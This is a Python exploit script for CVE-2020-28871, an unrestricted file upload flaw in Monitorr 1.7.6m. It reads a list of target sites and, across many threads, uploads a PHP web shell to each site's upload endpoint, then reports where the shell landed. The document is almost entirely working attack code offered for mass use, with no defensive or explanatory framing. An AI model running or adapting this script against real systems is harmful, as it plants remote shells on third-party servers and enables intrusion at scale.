# Monitorr 1.7.6m Unrestricted File Upload
# https://github.com/nastar-id
# Change nastar.php if you want to use your own shell
# Don't forget to put your shell in the same folder

#!/usr/bin/python3

from multiprocessing.dummy import Pool
import argparse
import requests

def exploit(targets):
    url = "%s/assets/php/upload.php" % (targets)
    postdata = {
        "fileToUpload": open("nastar.php", "rb")
    }
    
    try:
        sess = requests.Session()
        reqs = requests.Request(
          method="POST", url=url, files=postdata
        ).prepare()
        reqs.url = url
        response = sess.send(reqs).text
        if "has been uploaded" in response:
            print("{+} %s/assets/data/usrimg/nastar.php\n" % (targets))
        else:
            print("{-} Shell failed %s\n" % (targets))
    except Exception as e:
        print("{-} Unexpected error%s\n" % (targets))
        pass

def banner():
    print("""
    ##################################################
    #                                                #
    #    Monitorr 1.7.6m Unrestricted File Upload    #
    #  Vendor: https://github.com/Monitorr/Monitorr  #
    #                 CVE-2020-28871                 #
    #                                                #
    ##################################################
    """)

def main():
    parser = argparse.ArgumentParser(description="Monitorr 1.7.6m Unrestricted File Upload")
    parser.add_argument(
        '-t', '--targets', help='Usage xploit.py -t list.txt', required=True)
    arg = parser.parse_args()
    banner()
    try:
        op = open(arg.targets,'r').read().splitlines()
        sites = [list.strip() for list in op]
        p = Pool(int(input('Thread : ')))
        p.map(exploit, sites)
    except KeyboardInterrupt:
        exit(1)

if __name__ == "__main__":
    main()
